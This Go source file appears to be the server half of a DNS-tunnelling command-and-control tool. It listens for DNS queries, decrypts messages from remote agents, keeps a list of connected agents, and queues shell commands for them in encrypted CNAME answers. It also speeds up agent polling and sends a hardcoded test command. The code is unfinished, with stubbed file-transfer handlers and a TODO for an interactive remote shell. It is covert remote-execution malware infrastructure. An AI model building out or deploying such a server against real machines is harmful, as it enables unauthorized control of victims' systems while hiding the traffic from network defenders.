package server

import (
	"encoding/binary"
	"fmt"
	"math"
	"strings"
	"time"

	log "github.com/kpango/glg"
	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"
	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var packetBuffersWithSignature map[uint16][]c2.MessagePacketWithSignature

//3d buffer for public key and parentpartID. first string is the public key
var outgoingBuffer = make(map[string]map[uint16][]string)

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MessageType
	NextParentPartId                uint16
	HealthCheckIntervalMilliSeconds uint32
}

// first string is the public key
var ConnectedAgents = make(map[string]agentStatusForServer)

// log received healthcheck
func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	log.Infof("Healthcheck, coming from %s\n", Packet.Signature)
	//register new agent in agent list
	agent, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)
		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	if agent.NextMessageType == c2.MessageHealthcheck { // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
		// todo: fix this before removing the comment
		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
			agent.NextMessageType = c2.MessageSyncTime
			// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
			payload = []byte(time.Now().UTC().Format("2006-01-02T15:04:05-0700"))
		}
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		log.Infof("preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				log.Warnf("Error: %v", err) //todo:fix
			}
			q.Answer = append(q.Answer, cname)
		}
		// the MessageExecuteCommand here would only happen for the first packet. after this it's gonna be handled elsewhere
	} else if agent.NextMessageType == c2.MessageExecuteCommand { // we should check the buffer for this public key and pop the item in order and send it through
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}

	return nil
}

func MessageGetFileFromAgnet(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
	// if ParentPartID = 0 -> single packet
	// if ParentPartID != 0 -> incoming packets in the order of their PartID
	// if IsLastPart == true -> last packet
	// successful request incoming, need to see which packet are we dealing with
	// if o.Msg.ParentPartID != 0 { // multi part
	// 	//fist and middle packets
	// 	handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)] = append(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)], o)
	// 	if o.Msg.IsLastPart {
	// 		executeFunction(handler.packetBuffersWithSignature[int(o.Msg.ParentPartID)])
	// 	}
	// 	//todo: prepare response
	// 	return nil
	// } else { // single packet
	// 	executeFunction([]c2.MessagePacketWithSignature{o})
	// 	// todo: prepare response
	// }
	return nil
}

func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) error {
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) error {
	log.Infof("invoking command '%s' for the client", command)
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
	}
	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msg, []byte(command), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
	// check if agentPublicKey exists in packet buffer
	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartId]; !ok {
		//initialize the map
		outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
		targetBuffer = append(targetBuffer, Answers...)
		outgoingBuffer[agentPublicKey.String()][parentPartId] = targetBuffer
	} else {
		log.Errorf("key and ParentPartId already exists in the buffer. Please try again")
	}
	log.Infof("command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent := ConnectedAgents[agentPublicKey.String()]
	agent.NextMessageType = c2.MessageExecuteCommand
	agent.NextParentPartId = parentPartId
	agent.HealthCheckIntervalMilliSeconds = 500
	ConnectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1])) //todo: probably gonna crash at the last packet
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	q.Answer = append(q.Answer, cname)
	return nil
}

func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func executeFunction(packets []c2.MessagePacketWithSignature) error {
	fullPayload := make([]byte, 0)
	packets = c2.CheckMessageIntegrity(packets)
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	log.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
	// todo: clean the memory for this parentpartID
	return nil
}

func cleanupBuffer(timeout time.Duration) error {
	return nil //todo
}

func parseQuery(m *dns.Msg) error {
	outs, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
	if err != nil {
		log.Warnf("Error in Decrypting incoming packet", err)
	}
	for _, o := range outs {
		switch msgType := o.Msg.MessageType; msgType {
		case c2.MessageHealthcheck:
			return MessageHealthcheckHandler(o, m)
		case c2.MessageExecuteCommand:
			return HandleRunCommandAckFromAgent(o, m)
		case c2.MessageClientGetFile:
			return nil // todo
		case c2.MessageClientSendFile:
			return nil // todo
		case c2.MessageSetHealthInterval:
			return nil //
		case c2.MessageSyncTime:
			return nil // automatically done as part of routine healthcheck
		}

	}

	// }
	//todo: prepare response
	return nil
}

func handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := parseQuery(m)
		if err != nil {
			log.Warnf("bad request: %s", err)
		}
	}
	w.WriteMsg(m)
}

func runDns(cmd *cobra.Command) {

	dns.HandleFunc(".", handle53)

	// start server
	server := &dns.Server{Addr: conf.GlobalServerConfig.ListenAddress, Net: "udp"}
	log.Infof("Started DNS on %s -- listening", server.Addr)
	err := server.ListenAndServe()
	errorHandler(err)
	defer server.Shutdown()
}

func RunServer(cmd *cobra.Command, args []string) {
	// set global flag that we're running as server
	conf.Mode = conf.RunAsServer

	var err error
	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
	errorHandler(err)

	conf.GlobalServerConfig.PrivateKeyB32, err = cmd.Flags().GetString("privateKey")
	errorHandler(err)
	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyB32)
	errorHandler(err)

	// todo: public keys

	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	errorHandler(err)
	if !strings.HasSuffix(dnsSuffix, ".") {
		dnsSuffix = dnsSuffix + "."
	}
	if !strings.HasPrefix(dnsSuffix, ".") {
		dnsSuffix = "." + dnsSuffix
	}
	conf.GlobalServerConfig.DnsSuffix = dnsSuffix

	go runDns(cmd)
	timeticker := time.NewTicker(20 * time.Second)

	// todo: a CLI here to list the agents and allow intractive shell on the remote machine
	for {
		select {
		case <-timeticker.C:
			// cleanupBuffer(*handler, 60*time.Second) //TODO: make this work
			agent, _ := cryptography.PublicKeyFromString("AS5GLUGEPSMJC7BCDSZOGMWIINMQAEUHXHX7CMGXUIE42WVI24ZXT7K4MJHORY6ZHYNAPPTAMPAS3NBWDKE77AJ5WBB663Q72EDTYXN2")
			RunCommandOnAgent(agent, "echo kldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjn > /tmp/file.txt")
		}
	}
}
